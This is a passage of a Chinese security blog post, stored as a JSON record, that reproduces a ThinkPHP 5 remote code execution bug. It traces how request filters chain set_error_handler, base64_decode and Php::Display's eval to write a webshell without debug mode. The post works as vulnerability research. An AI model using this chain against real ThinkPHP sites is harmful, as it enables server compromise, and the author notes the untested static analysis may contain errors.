$config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;</code></pre>\n\n<p>之后一样进入check方法，进行属性覆盖，最后进入param方法</p>\n<p>这个implode是通过param方法中的get方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\nif (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;</code></pre>\n\n<p>这样这个get属性就变成了implode，之后进入input方法</p>\n<p>返回get的值，再将这个值和$vars合并在一起</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">switch ($method) &#123;\n               case&#39;POST&#39;:\n                   $vars &#x3D; $this-&gt;post(false);\n                   break;\n               case&#39;PUT&#39;:\n               case&#39;DELETE&#39;:\n               case&#39;PATCH&#39;:\n                   $vars &#x3D; $this-&gt;put(false);\n                   break;\n               default:\n                   $vars &#x3D; [];\n           &#125;</code></pre>\n\n<p>但是，这次的method的值为GET，所以只有一个get值，最后进入param方法最下面的input方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;</code></pre>\n\n<p>通过array_walk_recursive进行过滤，又进入filterValue方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">foreach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);</code></pre>\n\n<p>遍历filter数组分别进行过滤$value的值，这时的$value为impolde，filter[]为set_error_handler，self::path，base64_decode，\\think\\view\\driver\\Php::Display</p>\n<p>set_error_handler方法，看y4tacker的描述：</p>\n<p><strong>这里面还有一个比较巧妙的地方是set_error_handler的使用， tp5 默认就调用了 error_reporting(E_ALL) ，且有一套内置的错误处理机制。上面预期解也提到了即使报了 warning 程序也会中止执行。set_error_handler() 函数设置用户自定义的错误处理程序，会绕过标准 PHP 错误处理程序。其他的还有set_exception_handler() 函数设置用户自定义的异常处理函数。register_shutdown_function() 函数会注册一个会在PHP中止时执行的函数</strong></p>\n<p>之后就是self::path函数，返回path属性，也就base64编码的值，之后通过base64_decode进行解码，再通过Php::Display的eval执行代码，写入shell文件</p>\n<p>综上，需要implode是为了防止报错导致停止执行</p>\n<p>传入captche是为了让其他版本的tp的checkRoute返回路由，之后通过返回type为method</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">switch ($dispatch[&#39;type&#39;]) &#123;\n                case &#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;</code></pre>\n\n<p>在通过switch调用param方法，来进行写入文件。这样可以<strong>免除debug模式开启的条件</strong>。</p>\n<h1 id=\"吐槽：\"><a href=\"#吐槽：\" class=\"headerlink\" title=\"吐槽：\"></a>吐槽：</h1><p>这第二个payload一开始还真是弄不明白，跟到最后总算知道它的作用了</p>\n<p>这个洞太复杂，真的很难跟，而且还是用没开debug模式的vs直接一个一个看的，真<strong>纯静态分析</strong>！！！麻烦。。。。。</p>\n<p>没有调试过，有错误很正常。。。。。</p>\n<p>等弄好debug在调试看看吧！</p>\n<p>终于弄完了，干！！！</p>\n","text":" 参考文章：https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ https://y4tacker.blog.csdn.net/article/details/115893304 https://mp.weixin.qq.com/s/...","link":"","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"26 mins."},"categories":[{"name":"RCE","slug":"RCE","count":1,"path":"api/categories/RCE.json"}],"tags":[{"name":"thinphp","slug":"thinphp","count":1,"path":"api/tags/thinphp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A\"><span class=\"toc-text\">参考文章：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">复现：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E4%B8%AApayload%EF%BC%9A\"><span class=\"toc-text\">第一个payload：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E4%B8%AApayload%EF%BC%9A\"><span class=\"toc-text\">第二个payload：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%90%E6%A7%BD%EF%BC%9A\"><span class=\"toc-text\">吐槽：</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"Typecho1.1反序列化复现","uid":"10d60eae5b46a090616c469686df0945","slug":"Typecho1-1反序列化复现","date":"2022-10-17T11:42:19.000Z","updated":"2022-10-19T13:39:17.127Z","comments":true,"path":"api/articles/Typecho1-1反序列化复现.json","keywords":null,"cover":[],"text":" 参考资料：https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md 复现：常见的博客系统，在1.1版本的in...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"PHP反序列化","slug":"PHP反序列化","count":1,"path":"api/categories/PHP反序列化.json"}],"tags":[{"name":"PHP","slug":"PHP","count":1,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}